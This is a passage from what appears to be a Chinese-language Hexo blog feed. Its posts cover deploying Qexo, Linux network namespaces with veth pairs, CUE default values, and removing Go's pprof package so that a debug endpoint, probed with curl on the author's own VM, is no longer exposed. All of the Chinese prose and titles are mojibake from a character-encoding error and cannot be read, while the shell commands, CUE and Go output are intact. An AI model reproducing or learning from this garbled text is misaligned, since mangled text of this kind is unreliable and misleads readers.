class="hljs-variable">&lt;module&gt;</span>[line:79])<br>           _               _ <br>     /\   |<span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string"> </span>|<br>    /  \  |<span class="hljs-string"> </span>|<span class="hljs-string">__  _   _  __</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_   _ </span><br><span class="hljs-string">   / /\ \ </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ _</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>  / ____ \|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<br> /_/    \_\____/ \____|<span class="hljs-string">\____</span>|<span class="hljs-string">\____</span>|<br>å½“å‰ç¯å¢ƒ: æœ¬åœ°<br>System check identified no issues (0 silenced).<br>November 02, 2024 - 11:37:14<br>Django version 3.2.25, using settings &#x27;core.settings&#x27;<br>Starting development server at http://0.0.0.0:8000/<br>Quit the server with CONTROL-C.<br></code></pre></td></tr></table></figure><p>è®¿é—®æˆ‘è™šæ‹Ÿæœºçš„åœ°å€ï¼š192.168.20.201:8000</p><p>è®¾ç½®ç”¨æˆ·å’Œgithubä¸­åšå®¢ç§æœ‰ä»“åº“çš„åœ°å€github.io&#x2F;blogï¼Œç™»å½•è¿›æ¥å°±èƒ½çœ‹åˆ°ä¸‹é¢çš„é¡µé¢å•¦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102114409.png" alt="image.png"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://bakar.moe/linux-hexo-qexo/">åœ¨æœåŠ¡å™¨ä¸Šéƒ¨ç½²Hexo+Qexo</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘xxx</title>
    <link href="/2024/10/31/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91xxx/"/>
    <url>/2024/10/31/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91xxx/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># ip netns list</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns help</span><br>Usage: ip netns list<br>       ip netns add NAME<br>       ip netns <span class="hljs-built_in">set</span> NAME NETNSID<br>       ip [-all] netns delete [NAME]<br>       ip netns identify [PID]<br>       ip netns pids NAME<br>       ip [-all] netns <span class="hljs-built_in">exec</span> [NAME] cmd ...<br>       ip netns monitor<br>       ip netns list-id<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns add netns1</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip a </span><br>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link list</span><br>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns list</span><br>netns1<br><br><br><br><br><br><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ping 127.0.0.1</span><br>connect: Network is unreachable<br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link set dev lo up</span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ip link list</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ping 127.0.0.1</span><br>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms<br>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms<br>^C<br>--- 127.0.0.1 ping statistics ---<br>2 packets transmitted, 2 received, 0% packet loss, time 1024ms<br>rtt min/avg/max/mdev = 0.013/0.017/0.022/0.006 ms<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># ip link add veth0 type veth peer name veth1</span><br>[root@ningan ~]<span class="hljs-comment"># ip link set veth1 netns netns1</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># ip netns exec netns1 ifconfig veth1 10.1.1.1/24 up</span><br>[root@ningan ~]<span class="hljs-comment"># ifconfig veth0 10.1.1.2/24 up</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueè¯­è¨€ç³»åˆ—ã€‘(202410) cueä¸­é»˜è®¤å€¼è¯¥å¦‚ä½•è®¾ç½®ï¼Ÿ</title>
    <link href="/2024/10/30/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20cue%E4%B8%AD%E9%BB%98%E8%AE%A4%E5%80%BC%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%EF%BC%9F/"/>
    <url>/2024/10/30/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20cue%E4%B8%AD%E9%BB%98%E8%AE%A4%E5%80%BC%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaå­˜åœ¨"><a href="#åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaå­˜åœ¨" class="headerlink" title="åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaå­˜åœ¨"></a>åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaå­˜åœ¨</h2><p>è¾“å…¥ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">  a:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">  b:</span> *<span class="hljs-string">&quot;\(global.a)&quot;</span> | <span class="hljs-string">&quot;bbb&quot;</span><br><span class="hljs-symbol">  c:</span> <span class="hljs-string">&quot;\(global.b)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">a:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">b:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-symbol">c:</span> <span class="hljs-string">&quot;aaa&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaä¸å­˜åœ¨"><a href="#åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaä¸å­˜åœ¨" class="headerlink" title="åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaä¸å­˜åœ¨"></a>åœºæ™¯1ï¼šé»˜è®¤å€¼è®¾ç½®ä¸ºè¯»å–aå˜é‡çš„å€¼ï¼Œaä¸å­˜åœ¨</h2><p>è¾“å…¥ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">global: &#123;<br>  <span class="hljs-selector-tag">b</span>: *<span class="hljs-string">&quot;\(global.a)&quot;</span> | <span class="hljs-string">&quot;bbb&quot;</span><br>  c: <span class="hljs-string">&quot;\(global.b)&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">global: &#123;<br><span class="hljs-selector-tag">b</span>: <span class="hljs-string">&quot;bbb&quot;</span><br>c: <span class="hljs-string">&quot;bbb&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘(202410) goè¯­è¨€ä¸­httpServerçš„pprofæ¼æ´å¦‚ä½•é¿å…</title>
    <link href="/2024/10/23/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20go%E8%AF%AD%E8%A8%80%E4%B8%ADhttpServer%E7%9A%84pprof%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D/"/>
    <url>/2024/10/23/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202410)%20go%E8%AF%AD%E8%A8%80%E4%B8%ADhttpServer%E7%9A%84pprof%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>å·¥ä½œä¸­å†™çš„ä¸€ä¸ªgoä»£ç è¢«å®‰å…¨ä¸­å¿ƒæ£€æŸ¥å‡ºæ¥äº†pprofæ¼æ´ï¼Œæƒ³è¦é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæ•…åšäº†å¦‚ä¸‹å®éªŒã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆ1ï¼šç›´æ¥å»æ‰pprof"><a href="#è§£å†³æ–¹æ¡ˆ1ï¼šç›´æ¥å»æ‰pprof" class="headerlink" title="è§£å†³æ–¹æ¡ˆ1ï¼šç›´æ¥å»æ‰pprof"></a>è§£å†³æ–¹æ¡ˆ1ï¼šç›´æ¥å»æ‰pprof</h1><h2 id="ä»£ç å¦‚ä¸‹"><a href="#ä»£ç å¦‚ä¸‹" class="headerlink" title="ä»£ç å¦‚ä¸‹"></a>ä»£ç å¦‚ä¸‹</h2><p>å·¦è¾¹çš„ä»£ç æ²¡æœ‰pprofåŒ…ï¼Œå³è¾¹çš„ä»£ç æœ‰pprofåŒ…ï¼Œä¸¤è¾¹å„èµ·äº†ä¸¤ä¸ªhttpServer</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241023115400.png" alt="image.png"></p><p>åˆ†åˆ«å¼€ä¸¤ä¸ªshellå¯åŠ¨è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># go run hEqual1/main.go -a=&quot;0.0.0.0:6010&quot; -b=&quot;0.0.0.0:6011&quot; </span><br>2024/10/22 06:36:47 Starting server on  0.0.0.0:6010<br>2024/10/22 06:36:47 Starting server on  0.0.0.0:6011<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># go run hEqual0/main.go -a=&quot;0.0.0.0:6020&quot; -b=&quot;0.0.0.0:6021&quot; </span><br>2024/10/22 06:37:05 Starting server on  0.0.0.0:6020<br>2024/10/22 06:37:05 Starting server on  0.0.0.0:6021<br><br></code></pre></td></tr></table></figure><p>æ ¡éªŒç»“æœï¼š<br>æœ‰pprofåŒ…çš„ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6010/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x430fd1 0x467fbd 0x661411 0x661245 0x65dce6 0x66f2e8 0x66fde5 0x61dee9 0x61f802 0x6204ae 0x61cd14 0x46d821<br><span class="hljs-comment">#       0x467fbc        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:844</span><br><span class="hljs-comment">#       0x661410        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x661244        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:694</span><br><span class="hljs-comment">#       0x65dce5        runtime/pprof.(*Profile).WriteTo+0x145                  /usr/local/go/src/runtime/pprof/pprof.go:329</span><br><span class="hljs-comment">#       0x66f2e7        net/http/pprof.handler.ServeHTTP+0x4a7                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x66fde4        net/http/pprof.Index+0xe4                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x61dee8        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2136</span><br><span class="hljs-comment">#       0x61f801        net/http.(*ServeMux).ServeHTTP+0x141                    /usr/local/go/src/net/http/server.go:2514</span><br><span class="hljs-comment">#       0x6204ad        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:2938</span><br><span class="hljs-comment">#       0x61cd13        net/http.(*conn).serve+0x5f3                            /usr/local/go/src/net/http/server.go:2009</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b38fa 0x4b38e8 0x5581a5 0x562125 0x616c57 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b38f9        internal/poll.(*pollDesc).waitRead+0x279        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b38e7        internal/poll.(*FD).Read+0x267                  /usr/local/go/src/internal/poll/fd_unix.go:164</span><br><span class="hljs-comment">#       0x5581a4        net.(*netFD).Read+0x24                          /usr/local/go/src/net/fd_posix.go:55</span><br><span class="hljs-comment">#       0x562124        net.(*conn).Read+0x44                           /usr/local/go/src/net/net.go:179</span><br><span class="hljs-comment">#       0x616c56        net/http.(*connReader).backgroundRead+0x36      /usr/local/go/src/net/http/server.go:683</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x6774dd 0x677489 0x43b71b 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x6774dc        net/http.ListenAndServe+0x2bc                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x677488        main.main+0x268                                 /root/go-practice/chapter58-httpserver/hEqual1/main.go:42</span><br><span class="hljs-comment">#       0x43b71a        runtime.main+0x2ba                              /usr/local/go/src/runtime/proc.go:267</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x677745 0x6776ec 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x677744        net/http.ListenAndServe+0x1a4                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x6776eb        main.main.func1+0x14b                           /root/go-practice/chapter58-httpserver/hEqual1/main.go:34</span><br><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># </span><br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6011/debug/pprof/goroutine?debug=1</span><br>goroutine profile: total 4<br>1 @ 0x430fd1 0x467fbd 0x661411 0x661245 0x65dce6 0x66f2e8 0x66fde5 0x61dee9 0x61f802 0x6204ae 0x61cd14 0x46d821<br><span class="hljs-comment">#       0x467fbc        runtime/pprof.runtime_goroutineProfileWithLabels+0x1c   /usr/local/go/src/runtime/mprof.go:844</span><br><span class="hljs-comment">#       0x661410        runtime/pprof.writeRuntimeProfile+0xb0                  /usr/local/go/src/runtime/pprof/pprof.go:734</span><br><span class="hljs-comment">#       0x661244        runtime/pprof.writeGoroutine+0x44                       /usr/local/go/src/runtime/pprof/pprof.go:694</span><br><span class="hljs-comment">#       0x65dce5        runtime/pprof.(*Profile).WriteTo+0x145                  /usr/local/go/src/runtime/pprof/pprof.go:329</span><br><span class="hljs-comment">#       0x66f2e7        net/http/pprof.handler.ServeHTTP+0x4a7                  /usr/local/go/src/net/http/pprof/pprof.go:267</span><br><span class="hljs-comment">#       0x66fde4        net/http/pprof.Index+0xe4                               /usr/local/go/src/net/http/pprof/pprof.go:384</span><br><span class="hljs-comment">#       0x61dee8        net/http.HandlerFunc.ServeHTTP+0x28                     /usr/local/go/src/net/http/server.go:2136</span><br><span class="hljs-comment">#       0x61f801        net/http.(*ServeMux).ServeHTTP+0x141                    /usr/local/go/src/net/http/server.go:2514</span><br><span class="hljs-comment">#       0x6204ad        net/http.serverHandler.ServeHTTP+0x8d                   /usr/local/go/src/net/http/server.go:2938</span><br><span class="hljs-comment">#       0x61cd13        net/http.(*conn).serve+0x5f3                            /usr/local/go/src/net/http/server.go:2009</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x6774dd 0x677489 0x43b71b 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x6774dc        net/http.ListenAndServe+0x2bc                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x677488        main.main+0x268                                 /root/go-practice/chapter58-httpserver/hEqual1/main.go:42</span><br><span class="hljs-comment">#       0x43b71a        runtime.main+0x2ba                              /usr/local/go/src/runtime/proc.go:267</span><br><br>1 @ 0x43bb8e 0x434597 0x468385 0x4b2da7 0x4b446c 0x4b445a 0x5592e9 0x56965e 0x568970 0x620904 0x620571 0x677745 0x6776ec 0x46d821<br><span class="hljs-comment">#       0x468384        internal/poll.runtime_pollWait+0x84             /usr/local/go/src/runtime/netpoll.go:343</span><br><span class="hljs-comment">#       0x4b2da6        internal/poll.(*pollDesc).wait+0x26             /usr/local/go/src/internal/poll/fd_poll_runtime.go:84</span><br><span class="hljs-comment">#       0x4b446b        internal/poll.(*pollDesc).waitRead+0x2ab        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89</span><br><span class="hljs-comment">#       0x4b4459        internal/poll.(*FD).Accept+0x299                /usr/local/go/src/internal/poll/fd_unix.go:611</span><br><span class="hljs-comment">#       0x5592e8        net.(*netFD).accept+0x28                        /usr/local/go/src/net/fd_unix.go:172</span><br><span class="hljs-comment">#       0x56965d        net.(*TCPListener).accept+0x1d                  /usr/local/go/src/net/tcpsock_posix.go:152</span><br><span class="hljs-comment">#       0x56896f        net.(*TCPListener).Accept+0x2f                  /usr/local/go/src/net/tcpsock.go:315</span><br><span class="hljs-comment">#       0x620903        net/http.(*Server).Serve+0x363                  /usr/local/go/src/net/http/server.go:3056</span><br><span class="hljs-comment">#       0x620570        net/http.(*Server).ListenAndServe+0x70          /usr/local/go/src/net/http/server.go:2985</span><br><span class="hljs-comment">#       0x677744        net/http.ListenAndServe+0x1a4                   /usr/local/go/src/net/http/server.go:3239</span><br><span class="hljs-comment">#       0x6776eb        main.main.func1+0x14b                           /root/go-practice/chapter58-httpserver/hEqual1/main.go:34</span><br><br>1 @ 0x46d821<br><br></code></pre></td></tr></table></figure><p>æ— pprofåŒ…çš„ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6020/debug/pprof/goroutine?debug=1</span><br>404 page not found<br>[root@ningan chapter58-httpserver]<span class="hljs-comment"># curl http://192.168.20.201:6021/debug/pprof/goroutine?debug=1</span><br>404 page not found<br></code></pre></td></tr></table></figure><p>ç»“æœè¯æ˜ï¼Œåªè¦æŠŠå¼•ç”¨çš„pprofåŒ…åˆ 